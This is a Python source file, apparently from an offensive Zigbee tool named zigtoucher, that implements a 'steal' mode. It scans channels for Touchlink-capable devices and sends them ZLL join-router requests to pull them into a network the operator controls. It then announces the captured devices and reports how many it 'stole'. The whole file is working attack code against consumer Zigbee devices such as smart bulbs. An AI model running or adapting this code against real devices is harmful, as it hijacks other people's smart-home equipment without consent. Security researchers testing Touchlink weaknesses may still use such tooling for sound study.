from typing import Type, List
import enum
import logging
import tabulate
import termcolor
import time

import scapy.all as sp

import zigtoucher.config as config
import zigtoucher.mode.base as modebase
import zigtoucher.nwkcontrol as nwkcontrol
import zigtoucher.transceiver as transceiver
import zigtoucher.writer as writer
import zigtoucher.zigbee.entity as zb_e
import zigtoucher.zigbee.touchlink.builder as zbt_b


logger = logging.getLogger("zigtoucher.mode.steal")


class Steal(modebase.Mode):
    """Mode for stealing Touchlink capable devices to given NWK file."""

    # FSM states
    class _State(enum.Enum):
        """Steal mode FSM states."""

        SEND_SCAN = enum.auto()
        RECV_SCAN = enum.auto()
        SEND_JOIN = enum.auto()
        RECV_JOIN = enum.auto()
        SEND_ANNC = enum.auto()

    def __init__(
        self,
        _transceiver: Type[transceiver._Transceiver],
        timeout: int,
        channels: List[int],
        results: bool,
        target: zb_e.IEEEAddr,
        _nwkcontrol: Type[nwkcontrol.NwkControl],
    ) -> None:
        super().__init__(
            _transceiver,
            timeout,
            channels,
            results,
            zb_e.IEEEAddr(_nwkcontrol.network.ext_pan_id.get()),
        )
        """Constructor saving all options for this run mode.

        :param _transceiver: Transceiver to be used for comms.
        :type _transceiver: Type[transceiver._Transceiver]
        :param timeout: Timeout for automatic mode exit.
        :type timeout: int
        :param channels: Channels to be cycled while running.
        :type channels: List[int]
        :param results: Show detailed results.
        :type results: bool
        :param target: Address of target to be reset.
        :type target: zb_e.IEEEAddr
        :param _nwkcontrol: NWK file NwkControl instance to be used.
        :type _nwkcontrol: nwkcontrol.NwkControl
        """
        self.__target = target
        self.__nwkcontrol = _nwkcontrol
        self.__targets = {channel: {} for channel in self._channels}
        self.__reset()

    def __reset(self) -> None:
        """Reset FSM state and packet builder attributes to defaults. Move channel."""
        self.__scan_cnt = 0
        self.__dest_ieee_addr = zb_e.IEEEAddr()
        self.__response_id = None
        self.__builder = zbt_b.Builder(
            zb_e.IEEEAddr(self.__nwkcontrol.network.ext_pan_id.get())
        )
        self.__state = self._State.SEND_SCAN
        self._next_channel()

    def __print_results(self) -> None:
        """Print detailed results by channel."""
        for channel, targets in self.__targets.items():
            print(
                termcolor.colored(f"\n Channel {channel} \n", attrs=["bold", "reverse"])
            )
            table = [[zb_e.IEEEAddr.HEADER, zb_e.NwkAddr.HEADER]]
            for ieee_addr, nwk_addr in targets.items():
                table.append([str(zb_e.IEEEAddr(ieee_addr)), str(nwk_addr)])
            for line in tabulate.tabulate(
                table, headers="firstrow", tablefmt="grid"
            ).splitlines():
                print("    " + line)

    def __print_summary(self) -> None:
        """Print quick results."""
        cnt = 0
        for targets in self.__targets.values():
            cnt += len(targets)
        print(
            termcolor.colored("\n Stole", attrs=["reverse"])
            + termcolor.colored(
                f" {cnt} {'target' if cnt == 1 else 'targets'}",
                attrs=["reverse", "bold"],
            )
            + termcolor.colored(f" into", attrs=["reverse"])
            + termcolor.colored(
                f" {self.__nwkcontrol.nwkfile}", attrs=["reverse", "bold"]
            )
            + termcolor.colored(f".\n", attrs=["reverse"])
        )

    def __pkt_skippable(self, pkt: sp.Packet, layer: sp.Packet) -> bool:
        """Is this target and given Scapy layer?

        :param pkt: Packet to be checked.
        :type pkt: sp.Packet
        :return: True if not interesting packet, False otherwise.
        :rtype: bool
        """
        return (
            pkt is None
            or pkt == self.__builder.last_pkt
            or not pkt.haslayer(layer)
            or (self.__target and self.__target.get() != pkt.src_addr)
            or pkt.inter_pan_transaction_id != self.__builder.ipan_transaction_id
        )

    def _act(self) -> str:
        """Steal Touchlink capabled devices using zb_b.Builder and zbt_b.Builder.

        :return: Empty string.
        :rtype: str
        """

        with modebase.SignalHandler() as kbd:
            while not self.timeout() and not kbd.interrupted:

                if self.__state == self._State.SEND_SCAN:
                    if self.__nwkcontrol.is_full():
                        logger.info("network full")
                        break
                    if self.__scan_cnt == 5:  # cycle channels after 5 scans
                        self.__reset()
                        continue
                    if self.__scan_cnt == 0:
                        pkt = self.__builder.scan_request()
                    else:
                        pkt = self.__builder.rebuild_mac_seqnum()
                    self.__scan_cnt += 1
                    self._transceiver.send(pkt)
                    self.__state = self._State.RECV_SCAN

                elif self.__state == self._State.RECV_SCAN:
                    pkt = self._transceiver.recv()
                    if self.__pkt_skippable(pkt, sp.ZLLScanResponse):
                        self.__state = self._State.SEND_SCAN
                        continue  # fastpath
                    src_addr = pkt.src_addr
                    if src_addr in self.__nwkcontrol.ieee_addrs:
                        self.__reset()
                        continue  # skip already stolen
                    self.__dest_ieee_addr.set(src_addr)
                    self.__builder.update_dest_ieee_addr(self.__dest_ieee_addr)
                    self.__builder.update_response_id(pkt.response_id)
                    self.__state = self._State.SEND_JOIN

                elif self.__state == self._State.SEND_JOIN:
                    pkt = self.__builder.join_router_request(
                        self.__nwkcontrol.network, self.__nwkcontrol.next_nwk_addr
                    )
                    self._transceiver.send(pkt)
                    self._set_timer()
                    self.__state = self._State.RECV_JOIN

                elif self.__state == self._State.RECV_JOIN:
                    if self._timer():
                        logger.info(
                            f"{self.__dest_ieee_addr} on"
                            f" channel {self._channel} timeout"
                        )
                        self.__reset()
                        continue
                    pkt = self._transceiver.recv()
                    if self.__pkt_skippable(pkt, sp.ZLLNetworkJoinRouterResponse):
                        continue  # fastpath
                    if pkt.status != 0:
                        logger.info(
                            f"{self.__dest_ieee_addr} on channel {self._channel} fail"
                        )
                        self.__reset()
                        continue
                    logger.info(
                        f"{self.__dest_ieee_addr} on channel"
                        f" {self._channel} as {self.__nwkcontrol.next_nwk_addr} "
                    )
                    self.__targets[self._channel][
                        self.__dest_ieee_addr.get()
                    ] = zb_e.NwkAddr(self.__nwkcontrol.next_nwk_addr.get())
                    self.__nwkcontrol.add_device(self.__dest_ieee_addr)
                    self.__state = self._State.SEND_ANNC

                elif self.__state == self._State.SEND_ANNC:
                    self._transceiver.set_channel(
                        self.__nwkcontrol.network.channel.get()
                    )
                    pkt = self.__nwkcontrol.builder.zdp_device_announcement()
                    self._transceiver.send(pkt)
                    self.__reset()

        try:
            self.__nwkcontrol.save()
        except Exception as e:
            logger.error(f"nwkcontrol: {e}")

        if self._results:
            self.__print_results()
        self.__print_summary()

        return ""
